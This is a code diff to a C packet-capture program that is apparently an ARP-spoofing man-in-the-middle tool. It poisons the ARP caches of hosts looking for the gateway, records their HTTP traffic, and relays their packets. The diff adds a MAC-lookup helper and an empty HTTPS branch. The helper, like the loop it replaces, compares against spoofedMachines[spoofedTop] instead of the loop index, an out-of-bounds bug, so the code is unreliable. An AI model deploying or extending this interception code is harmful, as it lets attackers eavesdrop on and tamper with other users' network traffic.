@@ -156,17 +156,35 @@ void handleHttp(TcpPacket *tcpPacket, uint16_t len)
     return;
 }
 
+bool isMacSpoofed(const uint8_t *mac)
+{
+    for (int i = 0; i < spoofedTop; i++)
+    {
+        if (memcmp(mac, spoofedMachines[spoofedTop].MacAddress, 6) == 0)
+        {
+            return true;
+        }
+    }
+    return false;
+}
+
 void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
 {
     u_char *dumpDevice = argument;
     const EthernetPacket *ethPacket = NULL;
     ethPacket = (EthernetPacket *)packet_content;
+    if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
+    {
+        // ignore it
+        return;
+    }
+
     uint32_t arp = ntohs(0x0806);
     uint32_t ipv4 = ntohs(0x0800);
-    if (ethPacket->header.ether_type == arp && enableAutoSpoof) // arp
+    if (ethPacket->header.ether_type == arp) // arp
     {
         ArpPacket *arpPacket = (ArpPacket *)ethPacket;
-        if (arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
+        if (enableAutoSpoof && arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
         {
             if (arpPacket->arp.ar_tip == gateAddr)
             // We got an newbie, spoof it
@@ -189,20 +207,21 @@ void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthd
                 pcap_dump(dumpDevice, packet_header, packet_content);
                 uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                 uint16_t checksum = TcpChecksum(tcpPacket);
+                uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
                 handleHttp(tcpPacket, len);
                 return;
             }
+            if (sourcePort == 443 || destPort == 443) // HTTPS
+            {
+            }
         }
     }
-    for (int i = 0; i < spoofedTop; i++)
+    if (isMacSpoofed(ethPacket->header.ether_shost))
     {
-        if (memcmp(ethPacket->header.ether_shost, spoofedMachines[spoofedTop].MacAddress, 6) == 0)
-        {
-            uint8_t *pkt = malloc(packet_header->len);
-            memcpy(pkt, packet_content, packet_header->len);
-            pcap_sendpacket(mainDevice, pkt, packet_header->len);
-            break;
-        }
+        uint8_t *pkt = malloc(packet_header->len);
+        memcpy(pkt, packet_content, packet_header->len);
+        pcap_sendpacket(mainDevice, pkt, packet_header->len);
+        free(pkt);
     }
 }
 
